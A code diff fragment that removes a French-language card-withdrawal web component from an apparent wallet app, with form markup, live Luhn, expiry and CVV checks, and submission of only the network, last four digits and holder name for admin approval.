id=\"minNote\"></div>\n\n  <button class=\"pay-btn\" id=\"toggleBtn\" type=\"button\">\n    <span class=\"ic\"></span>\n    Retrait par carte bancaire\n    <span class=\"arrow\">›</span>\n  </button>\n\n  <div class=\"panel\" id=\"panel\">\n    <div class=\"panel-inner\">\n\n      <div class=\"form-block\" id=\"formBlock\">\n        <div class=\"card-visual\" id=\"cardVisual\">\n          <div class=\"card-top\">\n            <div class=\"chip\"></div>\n            <div id=\"brandBadgeHolder\"><span class=\"brand-badge unknown\">CARTE</span></div>\n          </div>\n          <div>\n            <div class=\"card-number\" id=\"cardNumberDisplay\">•••• •••• •••• ••••</div>\n            <div class=\"card-bottom\">\n              <div class=\"card-name\" id=\"cardNameDisplay\">NOM DU TITULAIRE</div>\n              <div class=\"card-exp\" id=\"cardExpDisplay\"><small>EXP.</small>MM/AA</div>\n            </div>\n          </div>\n        </div>\n\n        <form id=\"cardForm\" novalidate>\n          <div class=\"field\">\n            <label for=\"cardNumber\">Numéro de carte</label>\n            <div class=\"input-wrap\">\n              <input type=\"text\" id=\"cardNumber\" inputmode=\"numeric\" autocomplete=\"cc-number\" placeholder=\"0000 0000 0000 0000\" maxlength=\"23\">\n              <span class=\"detect-pill\" id=\"detectPill\">—</span>\n              <span class=\"check-icon\" id=\"checkIcon\">\n                <svg id=\"checkIconOk\" width=\"12\" height=\"12\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"3\"><polyline points=\"20 6 9 17 4 12\"/></svg>\n                <svg id=\"checkIconBad\" width=\"11\" height=\"11\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"3\" style=\"display:none;\"><line x1=\"18\" y1=\"6\" x2=\"6\" y2=\"18\"/><line x1=\"6\" y1=\"6\" x2=\"18\" y2=\"18\"/></svg>\n              </span>\n            </div>\n            <div class=\"hint\" id=\"cardHint\">Le réseau (Visa, Mastercard, Amex…) est détecté automatiquement.</div>\n          </div>\n\n          <div class=\"field\">\n            <label for=\"cardName\">Titulaire de la carte</label>\n            <input type=\"text\" id=\"cardName\" autocomplete=\"cc-name\" placeholder=\"Nom et prénom\" style=\"font-family:inherit;letter-spacing:normal;\">\n          </div>\n\n          <div class=\"field-row\">\n            <div class=\"field\">\n              <label for=\"cardExp\">Expiration</label>\n              <div class=\"input-wrap\">\n                <input type=\"text\" id=\"cardExp\" inputmode=\"numeric\" autocomplete=\"cc-exp\" placeholder=\"MM/AA\" maxlength=\"5\">\n                <span class=\"check-icon\" id=\"expCheckIcon\">\n                  <svg class=\"ic-ok\" width=\"11\" height=\"11\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"3\"><polyline points=\"20 6 9 17 4 12\"/></svg>\n                  <svg class=\"ic-bad\" width=\"10\" height=\"10\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"3\" style=\"display:none;\"><line x1=\"18\" y1=\"6\" x2=\"6\" y2=\"18\"/><line x1=\"6\" y1=\"6\" x2=\"18\" y2=\"18\"/></svg>\n                </span>\n              </div>\n              <div class=\"hint\" id=\"expHint\"></div>\n            </div>\n            <div class=\"field\">\n              <label for=\"cardCvv\">Cryptogramme</label>\n              <div class=\"input-wrap\">\n                <input type=\"text\" id=\"cardCvv\" inputmode=\"numeric\" autocomplete=\"cc-csc\" placeholder=\"CVV\" maxlength=\"4\">\n                <span class=\"check-icon\" id=\"cvvCheckIcon\">\n                  <svg class=\"ic-ok\" width=\"11\" height=\"11\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"3\"><polyline points=\"20 6 9 17 4 12\"/></svg>\n                  <svg class=\"ic-bad\" width=\"10\" height=\"10\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"3\" style=\"display:none;\"><line x1=\"18\" y1=\"6\" x2=\"6\" y2=\"18\"/><line x1=\"6\" y1=\"6\" x2=\"18\" y2=\"18\"/></svg>\n                </span>\n              </div>\n              <div class=\"hint\" id=\"cvvHint\">Format uniquement</div>\n            </div>\n          </div>\n\n          <div class=\"wd-error\" id=\"wdError\"></div>\n\n          <button type=\"submit\" class=\"submit-btn\" id=\"submitBtn\">\n            <span class=\"spinner\"></span>\n            <span class=\"btn-txt\">Envoyer ma demande de retrait carte</span>\n          </button>\n\n          <div class=\"secure-note\">\n            <svg width=\"13\" height=\"13\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\"><rect x=\"3\" y=\"11\" width=\"18\" height=\"10\" rx=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg>\n            Les données sensibles de carte ne sont pas enregistrées ; seul le dernier 4 chiffres est conservé pour le suivi.\n          </div>\n        </form>\n      </div>\n\n      <div class=\"result\" id=\"resultBlock\">\n        <div class=\"badge\">\n          <svg width=\"26\" height=\"26\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2.5\"><polyline points=\"20 6 9 17 4 12\"/></svg>\n        </div>\n        <h2>Demande de retrait carte enregistrée</h2>\n        <p id=\"resultText\">Votre demande a été enregistrée. Le solde sera débité après validation par l’administration.</p>\n        <button type=\"button\" class=\"redo\" id=\"redoBtn\">Faire un nouvel essai</button>\n      </div>\n\n    </div>\n  </div>";
-      
-(function(){
-  const toggleBtn = root.querySelector('#toggleBtn');
-  const panel = root.querySelector('#panel');
-  const cardNumber = root.querySelector('#cardNumber');
-  const cardName = root.querySelector('#cardName');
-  const cardExp = root.querySelector('#cardExp');
-  const cardCvv = root.querySelector('#cardCvv');
-  const detectPill = root.querySelector('#detectPill');
-  const checkIcon = root.querySelector('#checkIcon');
-  const checkIconOk = root.querySelector('#checkIconOk');
-  const checkIconBad = root.querySelector('#checkIconBad');
-  const cardHint = root.querySelector('#cardHint');
-  const cardNumberDisplay = root.querySelector('#cardNumberDisplay');
-  const cardNameDisplay = root.querySelector('#cardNameDisplay');
-  const cardExpDisplay = root.querySelector('#cardExpDisplay');
-  const expCheckIcon = root.querySelector('#expCheckIcon');
-  const expHint = root.querySelector('#expHint');
-  const cvvCheckIcon = root.querySelector('#cvvCheckIcon');
-  const cvvHint = root.querySelector('#cvvHint');
-  const brandBadgeHolder = root.querySelector('#brandBadgeHolder');
-  const cardVisual = root.querySelector('#cardVisual');
-  const cardForm = root.querySelector('#cardForm');
-  const submitBtn = root.querySelector('#submitBtn');
-  const formBlock = root.querySelector('#formBlock');
-  const resultBlock = root.querySelector('#resultBlock');
-  const redoBtn = root.querySelector('#redoBtn');
-  const resultText = root.querySelector('#resultText');
 
-  // --- Montant / frais / récapitulatif : MÊMES règles que la page « Retirer » ---
-  // Toute la logique (lecture du montant, minimum, solde, frais, envoi, erreurs,
-  // succès) vient des fonctions globales partagées : readWithdrawAmount,
-  // validateWithdrawalAmount, withdrawalNet, runWithdrawal, withdrawalErrorMessage.
-  const amountInput = root.querySelector('#amountInput');
-  const errBox = root.querySelector('#wdError');
-  const quickBtns = root.querySelectorAll('.wd-quick-btn');
-  const fmtGbp = n => fmtAmt(n) + ' GBP';
-  function currentAmount() { return readWithdrawAmount(amountInput.value); }
-  function refreshTexts() {
-    root.querySelector('#amountLabel').textContent = t('withdrawAmountLabel');
-    root.querySelector('#wdMaxBtn').textContent = t('maxAmount');
-    root.querySelector('#wSumAmountLbl').textContent = t('withdrawAmountLabel');
-    root.querySelector('#wSumFeeLbl').textContent = t('withdrawalFeeLabel');
-    root.querySelector('#wSumNetLbl').textContent = t('youWillReceive');
-    root.querySelector('#wdBalance').textContent = t('availableBalance') + ' : ' + fmtGbp(state.wallet.usdtBalance);
-    root.querySelector('#minNote').textContent = getMinWithdrawal() > 0 ? t('minWithdrawalNote', {min: getMinWithdrawal()}) : '';
-    root.querySelector('#wSumFee').textContent = fmtGbp(state.settings.withdrawalFee);
-  }
-  function refreshSummary() {
-    const a = currentAmount();
-    root.querySelector('#wSumAmount').textContent = fmtGbp(a);
-    root.querySelector('#wSumNet').textContent = fmtGbp(withdrawalNet(a));
-  }
-  function showError(msg) { errBox.textContent = msg; errBox.classList.add('show'); }
-  amountInput.addEventListener('input', () => {
-    quickBtns.forEach(b => b.classList.remove('active'));
-    errBox.classList.remove('show');
-    refreshSummary();
-  });
-  amountInput.addEventListener('focus', () => amountInput.select());
-  quickBtns.forEach(btn => btn.addEventListener('click', () => {
-    const amount = Math.floor(state.wallet.usdtBalance * Number(btn.dataset.pct) * 100) / 100;
-    amountInput.value = amount > 0 ? amount : '';
-    quickBtns.forEach(b => b.classList.remove('active'));
-    btn.classList.add('active');
-    refreshSummary();
-  }));
-  refreshTexts();
-  refreshSummary();
-
-  let open = false;
-  toggleBtn.addEventListener('click', () => {
-    open = !open;
-    panel.classList.toggle('open', open);
-    toggleBtn.classList.toggle('open', open);
-    if (open) setTimeout(() => cardNumber.focus(), 350);
-  });
-
-  // --- Détection du réseau à partir du numéro de carte (plages IIN) ---
-  function detectBrand(digits) {
-    if (/^4/.test(digits)) return 'visa';
-    if (/^(5[1-5]|2(2[2-9][1-9]|2[3-9]\d|[3-6]\d{2}|7[0-1]\d|720))/.test(digits)) return 'mc';
-    if (/^3[47]/.test(digits)) return 'amex';
-    if (/^(6011|65|64[4-9]|622(12[6-9]|1[3-9]\d|[2-8]\d{2}|9[01]\d|92[0-5]))/.test(digits)) return 'discover';
-    return null;
-  }
-
-  const brandMeta = {
-    visa:     { label: 'VISA',       groups: [4,4,4,4], cvvLen: 3 },
-    mc:       { label: 'MASTERCARD', groups: [4,4,4,4], cvvLen: 3 },
-    amex:     { label: 'AMEX',       groups: [4,6,5],   cvvLen: 4 },
-    discover: { label: 'DISCOVER',   groups: [4,4,4,4], cvvLen: 3 },
-    default:  { label: null,         groups: [4,4,4,4], cvvLen: 3 }
-  };
-
-  function renderBadge(brand) {
-    if (brand === 'visa') {
-      brandBadgeHolder.innerHTML = '<span class="brand-badge visa">VISA</span>';
-    } else if (brand === 'mc') {
-      brandBadgeHolder.innerHTML = '<div class="mc-circles"><i></i><i></i></div>';
-    } else if (brand === 'amex') {
-      brandBadgeHolder.innerHTML = '<span class="brand-badge amex">AMEX</span>';
-    } else if (brand === 'discover') {
-      brandBadgeHolder.innerHTML = '<span class="brand-badge discover">DISCOVER</span>';
-    } else {
-      brandBadgeHolder.innerHTML = '<span class="brand-badge unknown">CARTE</span>';
-    }
-  }
-
-  function formatNumber(digits, groups) {
-    let out = [];
-    let i = 0;
-    for (const g of groups) {
-      if (i >= digits.length) break;
-      out.push(digits.slice(i, i + g));
-      i += g;
-    }
-    return out.join(' ');
-  }
-
-  function updateCardVisualNumber(digits, groups) {
-    const masked = digits.split('').map(() => '•');
-    let display = formatNumber(digits.length ? digits : [], groups);
-    if (!digits.length) {
-      cardNumberDisplay.textContent = '•••• •••• •••• ••••';
-      return;
-    }
-    // show real digits typed, masked template not needed since it's a demo
-    cardNumberDisplay.textContent = formatNumber(digits, groups).padEnd(0);
-  }
-
-  cardNumber.addEventListener('input', () => {
-    let digits = cardNumber.value.replace(/\D/g, '').slice(0, 19);
-    const brand = detectBrand(digits);
-    const meta = brandMeta[brand] || brandMeta.default;
-
-    cardNumber.value = formatNumber(digits, meta.groups);
-    updateCardVisualNumber(digits, meta.groups);
-    renderBadge(brand);
-
-    if (digits.length >= 2 && brand) {
-      detectPill.textContent = meta.label;
-      detectPill.className = 'detect-pill show ' + brand;
-      cardHint.textContent = meta.label.charAt(0) + meta.label.slice(1).toLowerCase() + ' détectée — cryptogramme à ' + meta.cvvLen + ' chiffres.';
-      cardHint.classList.remove('err-txt');
-      cardCvv.maxLength = meta.cvvLen;
-    } else if (digits.length >= 2) {
-      detectPill.textContent = '?';
-      detectPill.className = 'detect-pill show';
-      cardHint.textContent = 'Réseau non reconnu pour ce préfixe.';
-    } else {
-      detectPill.classList.remove('show');
-      cardHint.textContent = "Le réseau (Visa, Mastercard, Amex…) est détecté automatiquement.";
-      cardHint.classList.remove('err-txt');
-    }
-
-    // Vérification de la clé de contrôle (algorithme de Luhn) en direct
-    cardNumber.classList.remove('err');
-    if (digits.length < 12) {
-      checkIcon.className = 'check-icon';
-      checkIconOk.style.display = '';
-      checkIconBad.style.display = 'none';
-    } else if (luhnValid(digits)) {
-      checkIcon.className = 'check-icon show ok';
-      checkIconOk.style.display = '';
-      checkIconBad.style.display = 'none';
-      cardHint.textContent = (brand ? meta.label.charAt(0) + meta.label.slice(1).toLowerCase() + ' détectée — ' : '') + 'numéro valide (clé de contrôle correcte).';
-      cardHint.classList.remove('err-txt');
-    } else {
-      checkIcon.className = 'check-icon show bad';
-      checkIconOk.style.display = 'none';
-      checkIconBad.style.display = '';
-      cardHint.textContent = 'Numéro invalide — la clé de contrôle ne correspond pas.';
-      cardHint.classList.add('err-txt');
-      cardNumber.classList.add('err');
-    }
-  });
-
-  cardName.addEventListener('input', () => {
-    cardNameDisplay.textContent = cardName.value.trim() ? cardName.value.toUpperCase() : 'NOM DU TITULAIRE';
-  });
-
-  function setCheckIcon(el, state) {
-    el.className = 'check-icon' + (state ? ' show ' + state : '');
-    const ok = el.querySelector('.ic-ok');
-    const bad = el.querySelector('.ic-bad');
-    if (ok) ok.style.display = state === 'bad' ? 'none' : '';
-    if (bad) bad.style.display = state === 'ok' ? 'none' : (state === 'bad' ? '' : 'none');
-  }
-
-  cardExp.addEventListener('input', () => {
-    let v = cardExp.value.replace(/\D/g, '').slice(0, 4);
-    if (v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
-    cardExp.value = v;
-    cardExpDisplay.innerHTML = '<small>EXP.</small>' + (v || 'MM/AA');
-
-    cardExp.classList.remove('err');
-    if (v.length < 5) {
-      setCheckIcon(expCheckIcon, null);
-      expHint.textContent = '';
-      expHint.classList.remove('err-txt');
-      return;
-    }
-    const mm = parseInt(v.slice(0,2), 10);
-    const yy = parseInt(v.slice(3,5), 10);
-    const now = new Date();
-    const currentYY = now.getFullYear() % 100;
-    const currentMM = now.getMonth() + 1;
-
-    if (mm < 1 || mm > 12) {
-      setCheckIcon(expCheckIcon, 'bad');
-      expHint.textContent = 'Mois invalide (01 à 12).';
-      expHint.classList.add('err-txt');
-      cardExp.classList.add('err');
-    } else if (yy < currentYY || (yy === currentYY && mm < currentMM)) {
-      setCheckIcon(expCheckIcon, 'bad');
-      expHint.textContent = 'Carte expirée.';
-      expHint.classList.add('err-txt');
-      cardExp.classList.add('err');
-    } else {
-      setCheckIcon(expCheckIcon, 'ok');
-      expHint.textContent = 'Date valide.';
-      expHint.classList.remove('err-txt');
-    }
-  });
-
-  cardCvv.addEventListener('input', () => {
-    cardCvv.value = cardCvv.value.replace(/\D/g, '').slice(0, cardCvv.maxLength || 4);
-    cardCvv.classList.remove('err');
-    const needed = cardCvv.maxLength || 3;
-    if (cardCvv.value.length === 0) {
-      setCheckIcon(cvvCheckIcon, null);
-      cvvHint.textContent = 'Format uniquement';
-      cvvHint.classList.remove('err-txt');
-    } else if (cardCvv.value.length === needed) {
-      setCheckIcon(cvvCheckIcon, 'ok');
-      cvvHint.textContent = 'Format correct (' + needed + ' chiffres).';
-      cvvHint.classList.remove('err-txt');
-    } else {
-      setCheckIcon(cvvCheckIcon, 'bad');
-      cvvHint.textContent = needed + ' chiffres attendus.';
-      cvvHint.classList.add('err-txt');
-    }
-  });
-
-  function luhnValid(digits) {
-    let sum = 0, alt = false;
-    for (let i = digits.length - 1; i >= 0; i--) {
-      let n = parseInt(digits[i], 10);
-      if (alt) { n *= 2; if (n > 9) n -= 9; }
-      sum += n;
-      alt = !alt;
-    }
-    return digits.length > 0 && sum % 10 === 0;
-  }
-
-  function submitCardWithdrawal() {
-    errBox.classList.remove('show');
-    const amount = currentAmount();
-    // 1) Montant : exactement les mêmes contrôles que le retrait bancaire.
-    const amountErr = validateWithdrawalAmount(amount);
-    if (amountErr) { showError(amountErr); amountInput.focus(); return; }
-
-    // 2) Champs carte
-    const digits = cardNumber.value.replace(/\D/g, '');
-    const brand = detectBrand(digits);
-    const meta = brandMeta[brand] || brandMeta.default;
-
-    let valid = true;
-    if (digits.length < 12 || !luhnValid(digits)) {
-      cardNumber.classList.add('err');
-      cardHint.textContent = 'Numéro de carte invalide (échec de la clé de contrôle).';
-      cardHint.classList.add('err-txt');
-      valid = false;
-    } else {
-      cardNumber.classList.remove('err');
-    }
-    if (cardExp.value.length < 5) {
-      cardExp.classList.add('err'); valid = false;
-    } else {
-      const mm = parseInt(cardExp.value.slice(0,2), 10);
-      const yy = parseInt(cardExp.value.slice(3,5), 10);
-      const now = new Date();
-      const currentYY = now.getFullYear() % 100;
-      const currentMM = now.getMonth() + 1;
-      if (mm < 1 || mm > 12 || yy < currentYY || (yy === currentYY && mm < currentMM)) {
-        cardExp.classList.add('err'); valid = false;
-      } else {
-        cardExp.classList.remove('err');
-      }
-    }
-    if (cardCvv.value.length < meta.cvvLen) { cardCvv.classList.add('err'); valid = false; } else { cardCvv.classList.remove('err'); }
-    if (!cardName.value.trim()) { cardName.classList.add('err'); valid = false; } else { cardName.classList.remove('err'); }
-
-    if (!valid) return;
-
-    // 3) Envoi : MÊME pipeline que la page « Retirer » (runWithdrawal ->
-    //    wallet_transactions, type 'withdrawal', pending -> admin -> validation).
-    //    SÉCURITÉ : numéro complet, expiration et CVV ne quittent jamais ce
-    //    formulaire ; seuls réseau, 4 derniers chiffres et titulaire sont envoyés.
-    const label = meta.label || 'Carte';
-    const last4 = digits.slice(-4);
-    const dest = {
-      kind: 'card',
-      holder: cardName.value.trim().toUpperCase(),
-      network: label,
-      last4: last4,
-      clientRef: 'CARD-WD-' + Date.now(),
-      requestedAt: new Date().toISOString()
-    };
-    submitBtn.classList.add('loading');
-    submitBtn.disabled = true;
-    runWithdrawal(dest, amount, ({net}) => {
-      resultText.textContent = 'Votre demande de retrait de ' + fmtGbp(amount) + ' (vous recevrez ' + fmtGbp(net) + ' après frais) a été transmise à l’administration pour validation. Carte ' + label + ' se terminant par ' + last4 + '.';
-      formBlock.classList.add('hide');
-      resultBlock.classList.add('show');
-    }).catch(err => {
-      showError(withdrawalErrorMessage(err));
-    }).finally(() => {
-      submitBtn.classList.remove('loading');
-      submitBtn.disabled = false;
-    });
-  }
-  cardForm.addEventListener('submit', (e) => {
-    e.preventDefault();
-    requireAuth(submitCardWithdrawal);   // même garde que la page « Retirer »
-  });
-
-  redoBtn.addEventListener('click', () => {
-    cardForm.reset();
-    cardNumberDisplay.textContent = '•••• •••• •••• ••••';
-    cardNameDisplay.textContent = 'NOM DU TITULAIRE';
-    cardExpDisplay.innerHTML = '<small>EXP.</small>MM/AA';
-    renderBadge(null);
-    detectPill.classList.remove('show');
-    checkIcon.className = 'check-icon';
-    setCheckIcon(expCheckIcon, null);
-    setCheckIcon(cvvCheckIcon, null);
-    expHint.textContent = '';
-    cvvHint.textContent = 'Format uniquement';
-    cvvHint.classList.remove('err-txt');
-    cardHint.textContent = "Le réseau (Visa, Mastercard, Amex…) est détecté automatiquement.";
-    cardHint.classList.remove('err-txt');
-    [cardNumber, cardName, cardExp, cardCvv].forEach(el => el.classList.remove('err'));
-    resultBlock.classList.remove('show');
-    formBlock.classList.remove('hide');
-    amountInput.value = '';
-    quickBtns.forEach(b => b.classList.remove('active'));
-    errBox.classList.remove('show');
-    refreshTexts();
-    refreshSummary();
-  });
-})();
-
-    }
-  }
-  customElements.define('theterbank-card-deposit', TheterbankCardDeposit);
-})();
-</script>
 
 
 
